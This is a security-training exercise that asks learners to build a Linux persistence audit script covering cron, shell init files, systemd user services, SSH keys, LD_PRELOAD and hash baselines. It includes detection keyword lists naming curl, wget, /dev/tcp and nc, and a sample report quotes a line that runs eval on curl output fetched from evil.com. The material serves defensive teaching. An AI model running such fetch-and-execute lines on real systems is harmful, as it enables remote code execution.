# Task 11: Persistence Audit Script

## Objective

Write a comprehensive audit script that enumerates all common persistence points on a Linux system, checks for unexpected entries, verifies file integrity against known-good baselines, and produces a severity-rated report.

## Requirements (7 sub-tasks)

### Sub-task 1: Cron Audit
Write a function to enumerate ALL cron job locations:
- `/etc/crontab` (system crontab)
- `/etc/cron.d/*` (cron snippets)
- `/var/spool/cron/crontabs/*` (user crontabs)
- `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/` (run-parts dirs)
- `/etc/anacrontab` (anacron config)

For each, report the number of entries. Flag any entries containing:
- `@reboot` (persistence across reboot)
- Direct curl/wget/nc calls in the command
- Absolute paths to `/tmp`, `/dev/shm`, `/var/tmp`
- Entries owned by users who don't exist on the system

### Sub-task 2: Shell Init Audit
Audit all users (including root) for shell init file modifications:
- Check `.bashrc`, `.bash_profile`, `.profile`, `.bash_login` for each user
- Report files that are symlinks (attacker might link to a shared malicious file)
- Flag lines containing: `curl`, `wget`, `/dev/tcp`, `bash -i`, `nc`, `eval`, `base64 -d`
- Report file permissions that are group/world-writable

### Sub-task 3: systemd User Service Audit
Check for persistence via user-systemd:
- List user services for ALL users (iterate over home dirs, check `~/.config/systemd/user/`)
- List system-wide systemd timers
- Report any services with `Restart=always` or `Restart=on-failure` as MEDIUM
- Report any services with unknown/empty descriptions as HIGH
- Report any services whose ExecStart points to `/tmp`, `/dev/shm`, or hidden directories

### Sub-task 4: SSH Key Audit
Audit SSH authorized_keys:
- Check `~/.ssh/authorized_keys` for every user with a home directory
- Report number of keys per user
- Report keys with unexpected comments (doesn't match username/hostname pattern)
- Report keys with `command=` restrictions (could be a backdoor)
- Check permissions on `~/.ssh/authorized_keys` and `~/.ssh/` — must be 600 and 700 respectively

### Sub-task 5: LD_PRELOAD Check
Check for LD_PRELOAD-based persistence:
- Check `/etc/ld.so.preload` — if non-empty, flag as CRITICAL
- Check `systemctl show-environment` for `LD_PRELOAD`
- Check `~/.pam_environment` for PRELOAD entries
- Verify the hashes of any preloaded libraries against known-good (if baseline exists)

### Sub-task 6: Integrity Baseline
Create and verify against an integrity baseline:
- Store SHA256 hashes of all persistence files in a baseline directory
- On each run, compare current hashes against the baseline
- Report new, modified, and deleted entries
- Store the baseline in `~/.persistence_baseline/` (or a configurable location)

### Sub-task 7: Report Generation
Generate a structured report:
- Section for each audit category
- Severity: CRITICAL, HIGH, MEDIUM, LOW, INFO
- Count of findings per severity
- Summary at the end with overall status (PASS/FAIL based on severity thresholds)
- Exit code: 0 if no HIGH/CRITICAL, 1 if any HIGH/CRITICAL found

## Bonus Challenges

1. **Watch mode:** Add `--watch` flag that uses `inotifywait` to monitor persistence locations for changes in real-time
2. **CIS compliance:** Add `--cis` flag that checks findings against CIS Benchmark guidelines
3. **Remediation:** Add `--remediate` flag that offers to remove suspicious persistence (with user confirmation)
4. **JSON output:** Add `--json` flag that outputs findings in JSON format for integration with SIEM tools
5. **History diff:** Show when each file was first seen in the baseline vs. when it was last modified

## Hints

<details>
<summary>Hint 1: Getting all users with home directories</summary>

```bash
getent passwd | awk -F: '$6 ~ /^\/home/ {print $1, $6}'
```
For root, add manually: `root /root`
</details>

<details>
<summary>Hint 2: Checking @reboot entries</summary>

```bash
grep -r '@reboot' /var/spool/cron/crontabs/ /etc/crontab /etc/cron.d/ 2>/dev/null
```
Anacron uses `@daily`, `@weekly` format — different syntax.
</details>

<details>
<summary>Hint 3: Integrity baseline functions</summary>

```bash
BASEDIR="${BASELINE_DIR:-$HOME/.persistence_baseline}"
mkdir -p "$BASEDIR"

init_baseline() {
  find /etc/crontab /etc/cron.d /var/spool/cron/crontabs \
       /etc/systemd/system /home /root/.config -type f \
       -path '*/.config/systemd/*' -o \
       ... 2>/dev/null | sort | while read f; do
    sha256sum "$f" 2>/dev/null
  done > "$BASEDIR/baseline.sha256"
}

check_baseline() {
  sha256sum -c "$BASEDIR/baseline.sha256" 2>&1 | grep -v ': OK$'
}
```
</details>

<details>
<summary>Hint 4: Finding user systemd directories</summary>

```bash
for user_home in /root /home/*; do
  user=$(basename "$user_home")
  user_services="$user_home/.config/systemd/user"
  if [ -d "$user_services" ] && [ "$(ls -A "$user_services" 2>/dev/null)" ]; then
    echo "=== $user ==="
    for service_file in "$user_services"/*.service; do
      echo "Service: $(basename $service_file)"
      grep -E 'ExecStart=|Description=|Restart=' "$service_file" 2>/dev/null
    done
  fi
done
```
</details>

<details>
<summary>Hint 5: SSH key audit with detail</summary>

```bash
audit_ssh_keys() {
  local user="$1" home="$2"
  local keyfile="$home/.ssh/authorized_keys"

  if [ ! -f "$keyfile" ]; then
    return
  fi

  local count=$(wc -l < "$keyfile")
  local perms=$(stat -c '%a' "$keyfile" 2>/dev/null)

  if [ "$perms" != "600" ]; then
    report "SSH" "HIGH" "$user: authorized_keys permissions $perms (should be 600)"
  fi

  while read -r line; do
    if echo "$line" | grep -q '^command='; then
      report "SSH" "HIGH" "$user: authorized_keys has command-restricted key"
    fi
  done < "$keyfile"
}
```
</details>

<details>
<summary>Hint 6: Checking ld.so.preload</summary>

```bash
if [ -f /etc/ld.so.preload ] && [ -s /etc/ld.so.preload ]; then
  echo "CRITICAL: /etc/ld.so.preload is non-empty!"
  cat /etc/ld.so.preload
  while read lib; do
    if [ -f "$lib" ]; then
      sha256sum "$lib"
      nm -DC "$lib" 2>/dev/null | grep ' T ' | head -10
    fi
  done < /etc/ld.so.preload
fi
```
</details>

<details>
<summary>Hint 7: Color-coded severity output</summary>

```bash
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
NC='\033[0m'

report() {
  local category="$1" severity="$2" message="$3"
  case $severity in
    CRITICAL|HIGH) echo -e "${RED}[$severity]${NC} [$category] $message" ;;
    MEDIUM)        echo -e "${YELLOW}[$severity]${NC} [$category] $message" ;;
    LOW)           echo -e "${BLUE}[$severity]${NC} [$category] $message" ;;
    INFO)          echo -e "${GREEN}[$severity]${NC} [$category] $message" ;;
  esac
}
```
</details>

## Expected Output

```bash
$ ./persistence_audit.sh --baseline ~/.persistence_baseline

=== Persistence Audit v1.0 ===
Started: 2026-07-31 10:00:00
Baseline: /home/user/.persistence_baseline

[CRON AUDIT]
[INFO] /etc/crontab: 12 entries (1 @reboot)
[HIGH] /etc/cron.d/backup: ExecStart script is world-writable (/opt/scripts/backup.sh)
[INFO] /var/spool/cron/crontabs/: 3 users have crontabs
[MEDIUM] user 'alice': crontab contains @reboot /home/alice/.hidden/updater.sh

[SHELL INIT AUDIT]
[INFO] 4 users audited
[HIGH] /home/alice/.bashrc:15: eval "$(curl -s http://evil.com/checkin)"
[INFO] /home/alice/.bashrc: 22 lines
[INFO] /home/alice/.profile: 14 lines
[HIGH] /root/.bashrc is a symlink to /root/.other/file (unexpected)

[SYSTEMD AUDIT]
[INFO] System services: 142 loaded, 26 enabled
[HIGH] User 'jdoe': backdoor.service (Restart=always, Exec=/home/jdoe/.local/bin/.systemd-update)
[MEDIUM] User 'jdoe': legit.service has empty Description field

[SSH KEY AUDIT]
[INFO] 4 users with authorized_keys
[HIGH] root: authorized_keys has command=restricted key (sshd_config backdoor?)
[HIGH] alice: 7 keys found (expected 3 per baseline)
[INFO] bob: 1 key — matches expected

[LD_PRELOAD CHECK]
[CRITICAL] /etc/ld.so.preload is NOT empty!
  /usr/lib/libprocesshider.so
  Library hash: d41d8cd98f00b204e9800998ecf8427e
  Hooking: open, readdir, stat, lstat, connect, execve

[INTEGRITY CHECK]
[HIGH] /etc/crontab — hash MISMATCH (was: abc123, now: def456)
[INFO] /var/spool/cron/crontabs/alice — new (not in baseline)
[HIGH] /etc/systemd/system/backdoor.service — new (not in baseline)
[LOW]  /home/bob/.bashrc — hash mismatch (expected — user edited it)

=== SUMMARY ===
CRITICAL: 1
HIGH:     5
MEDIUM:   2
LOW:      1
INFO:     12

Overall: ❌ ISSUES FOUND — 6 findings above MEDIUM threshold

$ echo $?
1
```

## Self-Check Questions

1. Why would an attacker use `@reboot` in a user crontab rather than root's crontab? What are the advantages of user-level persistence?

2. How can `.bashrc` persistence survive a user switching from bash to zsh or fish? What would the attacker need to do differently?

3. Why are user systemd services (`--user`) less visible than system services in routine monitoring? What commands would miss them?

4. How can `ld.so.preload` be used for persistence without modifying any existing binaries? What detection techniques work against it?

5. What limitations does hash-based integrity checking have? How can an attacker bypass SHA256 baselines?

6. Why should you check the `command=` restriction in authorized_keys? How can this be used as a stealth backdoor?

7. What is the significance of `loginctl enable-linger` for persistence? When would an attacker need to enable it?
